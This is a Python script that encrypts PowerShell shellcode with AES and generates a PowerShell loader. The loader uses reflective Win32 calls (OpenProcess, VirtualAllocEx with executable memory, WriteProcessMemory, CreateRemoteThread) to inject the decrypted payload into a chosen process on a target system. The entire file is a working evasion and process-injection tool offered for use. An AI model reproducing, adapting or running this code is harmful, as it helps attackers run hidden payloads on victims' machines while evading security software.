from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from base64 import b64encode
import os
import sys
import argparse

def create_key():
    key = os.urandom(16)  # 16 bytes for AES-128
    cipher = AES.new(key, AES.MODE_ECB)
    return cipher, key

def read_shellcode(file):
    with open(file, "r") as data:
        shellcode = data.readline().replace("[Byte[]] $buf = ","")
    return shellcode

def aes_encrypt(file):
    cipher, key = create_key()
    shellcode = read_shellcode(file)
    encrypted = cipher.encrypt(pad(shellcode.encode("utf-8"), AES.block_size))
    encoded = b64encode(encrypted)

    return b64encode(key), encoded

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-f", "--file", help = "A file to read the PowerShell shellcode.", required = True)
    parser.add_argument("-p", "--process", help = "A process to inject into on the target system.", required = True)
    args = parser.parse_args()

    key, encoded_data = aes_encrypt(args.file)

    template = '''function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
    }

    function getDelegateType {

        Param (
            [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
            [Parameter(Position = 1)] [Type] $delType = [Void]
        )

        $type = [AppDomain]::CurrentDomain.
        DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
        DefineDynamicModule('InMemoryModule', $false).
        DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
        [System.MulticastDelegate])

    $type.
        DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
        SetImplementationFlags('Runtime, Managed')

    $type.
        DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
        SetImplementationFlags('Runtime, Managed')

        return $type.CreateType()
    }

    function Decrypt-String($base64key, $base64ciphertext) {
        $key = [System.Convert]::FromBase64String($base64key)
        $ciphertext = [System.Convert]::FromBase64String($base64ciphertext)

        $decryptor = New-Object System.Security.Cryptography.RijndaelManaged
        $decryptor.Mode = [System.Security.Cryptography.CipherMode]::ECB
        $decryptor.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $decryptor.KeySize = 128
        $decryptor.Key = $key
        $decryptor.BlockSize = 128
        $transform = $decryptor.CreateDecryptor();

        $plaintext = $transform.TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
        $utf8 = New-Object System.Text.UTF8Encoding
        $decoded = $utf8.GetString($plaintext)
        [byte[]]($decoded -split ',')
    }

    $proc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll OpenProcess), (getDelegateType @([UInt32], [bool], [UInt32]) ([IntPtr]))).Invoke(0x001F0FFF, $false, (Get-Process ''' + args.process + ''').Id[0])
    $ex = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAllocEx), (getDelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke($proc, [IntPtr]::Zero, 0x1000, 0x3000, 0x40)

    $key = "''' + key.decode() + "\"\n" + "$data = \"" + encoded_data.decode() + "\"\n" + \
    '''[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WriteProcessMemory), (getDelegateType @([IntPtr], [IntPtr], [byte[]], [UInt32], [IntPtr]) ([bool]))).Invoke($proc, $ex, (Decrypt-String $key $data), (Decrypt-String $key $data).length, [IntPtr]::Zero)
    $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateRemoteThread), (getDelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke($proc,[IntPtr]::Zero,0,$ex,[IntPtr]::Zero,0,[IntPtr]::Zero)

    '''
    with open("simplescript.ps1", "w") as ps:
        ps.write(template)

if __name__ == "__main__":
    main()
